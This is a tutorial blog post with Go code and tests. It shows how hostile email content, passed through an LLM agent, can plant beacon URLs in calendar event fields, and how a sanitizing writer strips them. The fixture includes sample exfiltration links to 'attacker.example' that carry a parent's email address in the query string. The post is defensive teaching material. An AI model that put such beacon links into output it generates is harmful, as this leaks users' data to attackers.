---
title: "The calendar-field exfil"
description: "The last post stopped a secret coming in. This one stops a secret going out, through the one thing the agent sends into the world: the calendar file it writes. A URL hidden in an event's location or notes is a beacon that fires when a calendar app renders it, so the agent's writer strips every link from every field before the file is ever saved."
date: 2025-12-02
draft: false
tags: ["ai-security", "golang", "agents", "exfiltration"]
series: "AI Security Engineering"
---

_Part of my [AI Security Engineering](/blog/the-plan/) series, a local email-to-calendar agent I build, then attack, then harden. If you have not set up the lab yet, start with [Set up your lab](/blog/setting-up-the-lab/). The lessons are [on GitHub](https://github.com/t0ul/ai-security-engineering), and the agent itself lives at [t0ul/emaildrop](https://github.com/t0ul/emaildrop)._

## Inert is not the same as harmless

[The last post](/blog/scrubbing-secrets-and-pii/) stopped a secret from getting into the agent's memory. This one stops a secret from getting out. Way back in [the inert-output post](/blog/inert-output-and-the-human-accept/) I made a point of the agent writing a calendar file and nothing else, no auto-add, nothing that touches a real calendar on its own. That makes the output safe to accept by hand. It does not make the output content safe, and those are different things.

Here is the gap. The fields of an event, its location and its notes, are filled from the email, which means a hostile email can put whatever it wants in them, by way of the model. And a calendar file is not just read; it is rendered by a calendar app, which will happily turn a URL in a location or a notes field into something it fetches or something you click. So a link sitting in an event field is a beacon. It fires when the event is displayed, and its query string can carry data out. The file never ran anything. The calendar app did the reaching, on the attacker's behalf. This is LLM05, improper output handling, and it is a control lesson, deterministic, no model:

```bash
cd posts/05.2-the-calendar-field-exfil
go run .
```

The whole program is on this page, in the order it runs, so you can type it in instead of cloning. Make an empty folder, run `go mod init exfil`, then `go get github.com/t0ul/emaildrop@` followed by the version on the first `require` line below, and put the code in one file called `main.go`:

<!-- listing: go.mod#all -->
```
module github.com/t0ul/ai-security-engineering/posts/05.2-the-calendar-field-exfil

go 1.27.1

// The agent's real calendar writer and event shape. No overrides.
require github.com/t0ul/emaildrop v0.0.0-20261011232453-771805568f76
```
<!-- /listing -->

## The spine of the program

The top of the file names the one thing that must never survive into a calendar file, the attacker's host, and builds the poisoned event: a plausible Book Fair with a tracking beacon in its location and, in its notes, a link that smuggles a parent's address out in the query string. `main` writes that event with a naive writer and with the agent's real one and checks for the host in each file.

<!-- listing: main.go#head -->
```go
// Command main is the runnable demo for lesson 05.2, the calendar-field exfil.
//
// Run it with:
//
//	go run .
//
// The agent's only output is an inert .ics file. Inert does not mean harmless: a
// URL hidden in an event's location or notes is a beacon that fires when a calendar
// client renders the field, and it can carry data out in its query string. This
// demo writes an event whose fields carry an exfiltration URL with a naive writer
// and finds the URL in the file, then writes the same event with the agent's real
// writer and finds it stripped. Deterministic, no model.
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/t0ul/emaildrop/pkg/agent/ics"
	"github.com/t0ul/emaildrop/pkg/agent/schema"
)

// attackerHost is what must never survive into a calendar file.
const attackerHost = "attacker.example"

// exfilEvent is a plausible event whose fields were poisoned: a tracking beacon in
// the location, and a link in the notes that smuggles a parent's address out.
func exfilEvent() schema.Event {
	ev := schema.New("Book Fair", "2026-10-10T09:00:00")
	ev.Location = "Library http://attacker.example/pixel.gif"
	ev.Notes = "RSVP at http://attacker.example/exfil?who=parent.contact@example.com"
	return ev
}

func main() {
	leaked := naiveLeaks()
	blocked := writerStrips()

	fmt.Println()
	if leaked && blocked {
		fmt.Println("attack blocked (the receipt): the beacon survives a naive writer, stripped by the real one")
	} else {
		fmt.Println("a control did not hold")
		os.Exit(1)
	}
}
```
<!-- /listing -->

## I. A field is a channel

Take that event and write it the obvious way, serializing each field straight into the `.ics`. That is `naiveICS`, a faithful serializer, and under it the run that prints the two poisoned lines and asks whether the attacker's host is in the file:

<!-- listing: main.go#before: a naive writer puts the fields in as-is -->
```go
// ---- before: a naive writer puts the fields in as-is ----

// naiveICS is the calendar writer I would write first: take the event's fields and
// put them straight into the .ics. It is a faithful serializer, which is exactly
// the problem, because the fields are attacker-controlled.
func naiveICS(ev schema.Event) string {
	var b strings.Builder
	b.WriteString("BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\n")
	fmt.Fprintf(&b, "SUMMARY:%s\r\n", ev.Title)
	fmt.Fprintf(&b, "LOCATION:%s\r\n", ev.Location)
	fmt.Fprintf(&b, "DESCRIPTION:%s\r\n", ev.Notes)
	b.WriteString("END:VEVENT\r\nEND:VCALENDAR\r\n")
	return b.String()
}

func naiveLeaks() bool {
	fmt.Println("== before: a naive calendar writer ==")
	text := naiveICS(exfilEvent())
	for _, l := range lines(text, "LOCATION", "DESCRIPTION") {
		fmt.Printf("  %s\n", l)
	}
	present := strings.Contains(text, attackerHost)
	fmt.Printf("  the beacon host %q is in the file: %v (it fires when the event is rendered)\n", attackerHost, present)
	return present
}
```
<!-- /listing -->

Look at what you get:

```
== before: a naive calendar writer ==
  LOCATION:Library http://attacker.example/pixel.gif
  DESCRIPTION:RSVP at http://attacker.example/exfil?who=parent.contact@example.com
  the beacon host "attacker.example" is in the file: true (it fires when the event is rendered)
```

Both URLs are right there in the file. The naive writer did nothing wrong as a serializer; it put the event's fields into the event. But a faithful serializer of attacker-controlled fields is an exfiltration tool. When this event is imported and shown, the pixel in the location fetches on render, and the address in the notes is one click from leaving. The data the last post kept out of the corpus walks right out through the calendar instead.

## II. The field sanitizer

The writer has to treat those fields as what they are: untrusted output, filled by a model that read a stranger's email. So the agent's real calendar writer, `ics.Write`, runs every field through a sanitizer on the way out. It finds links and active schemes, plain `http` and `https` but also the sneakier `data:` and `javascript:`, and replaces each with a visible placeholder, and it returns a count of how many it pulled out so the removal is auditable. What it defends against is exactly this: a URL in a rendered field can never leave the agent, because the agent never writes one.

Here is the same poisoned event through the real writer. The whole defended path is the one call to `ics.Write`, which returns the text, how many links it removed, and an error:

<!-- listing: main.go#after: the agent's real writer sanitizes every field -->
```go
// ---- after: the agent's real writer sanitizes every field ----

func writerStrips() bool {
	fmt.Println("\n== after: the agent's real ics.Write ==")
	text, removed, err := ics.Write([]schema.Event{exfilEvent()}, "email-to-calendar")
	if err != nil {
		panic(err)
	}
	for _, l := range lines(text, "LOCATION", "DESCRIPTION") {
		fmt.Printf("  %s\n", l)
	}
	present := strings.Contains(text, attackerHost)
	fmt.Printf("  links/schemes removed: %d; the beacon host in the file: %v\n", removed, present)
	return !present
}
```
<!-- /listing -->

What comes out:

```
== after: the agent's real ics.Write ==
  LOCATION:Library [link removed]
  DESCRIPTION:RSVP at [link removed]
  DESCRIPTION:Book Fair
  links/schemes removed: 2; the beacon host in the file: false
```

Two links removed, and the attacker's host is nowhere in the file. The event is still a perfectly good calendar entry, a Book Fair at the library with an RSVP note, it just no longer carries a beacon. The exfiltration channel went from open to closed, measured by the one thing that matters: whether the attacker's host survives into the file, and it does not.

The one helper picks the two field lines out of the calendar text for printing:

<!-- listing: main.go#helpers -->
```go
// ---- helpers ----

func lines(text string, prefixes ...string) []string {
	var out []string
	for _, l := range strings.Split(text, "\r\n") {
		for _, p := range prefixes {
			if strings.HasPrefix(l, p) {
				out = append(out, l)
			}
		}
	}
	return out
}
```
<!-- /listing -->

That is the whole program. Its tests assert both halves, and separately that the real writer reports what it stripped and never lets the host through. Put them next to `main.go` as `contract_test.go`:

<!-- listing: contract_test.go#all -->
```go
package main

import (
	"strings"
	"testing"

	"github.com/t0ul/emaildrop/pkg/agent/ics"
	"github.com/t0ul/emaildrop/pkg/agent/schema"
)

// Deterministic, no model. A naive writer carries the exfil URL into the calendar
// file; the agent's real writer strips every link and active scheme from the
// fields, so the beacon host never survives.

func TestNaiveLeaksBeaconStrippedByWriter(t *testing.T) {
	if !naiveLeaks() {
		t.Fatal("a naive writer should carry the beacon into the file; otherwise there is nothing to fix")
	}
	if !writerStrips() {
		t.Fatal("ics.Write must strip the beacon from every field")
	}
}

func TestWriterReportsRemovals(t *testing.T) {
	_, removed, err := ics.Write([]schema.Event{exfilEvent()}, "cal")
	if err != nil {
		t.Fatal(err)
	}
	if removed < 2 {
		t.Fatalf("expected the writer to report the links it stripped; removed=%d", removed)
	}
	text, _, _ := ics.Write([]schema.Event{exfilEvent()}, "cal")
	if strings.Contains(text, attackerHost) {
		t.Fatal("the beacon host survived into the .ics")
	}
}
```
<!-- /listing -->

## A note on the links we do keep

There is one honest exception worth naming, because "strip every URL" is too blunt a rule to be the real one. The agent does handle genuine action items, an RSVP link, a permission-slip form, where the link is the entire point, and for those it keeps the URL. But it keeps it only after checking the URL is a well-formed `http` or `https` address, and it never lets that link fire on its own: following it is gated and sandboxed at the moment you choose to act on it, which is its own post later in the book. So the rule is not "no URLs." It is that a link is never emitted as a live field that a calendar app will quietly reach on its own. A link the agent keeps is one a human deliberately acts on, through a gate, not one that beacons the instant an event is drawn on screen.

## Conclusion

So the agent's one piece of output can no longer be turned into a quiet channel for data to leave. Secrets are scrubbed before they are stored, and links are stripped before the calendar file is written, which closes the two obvious ends, what comes in and what the agent itself sends out.

There is a third surface, and it is the one people forget because it does not feel like output at all: the screen. The next post is the tracking pixel in a different disguise, a markdown image or link in something the agent shows you, which your own browser renders and beacons the moment the page loads. The fix rhymes with this one, allow-list what is safe to render, but the surface is new.

## Take it to your own project

Treat every outbound field as an exfil channel:

- Sanitize each field that leaves the system, not just the obvious ones.
- Allowlist what a field may contain; strip the rest.
- Assume any free-text or URL field can smuggle data out.
- Test with a payload hidden in notes and URLs, and confirm it does not leave.
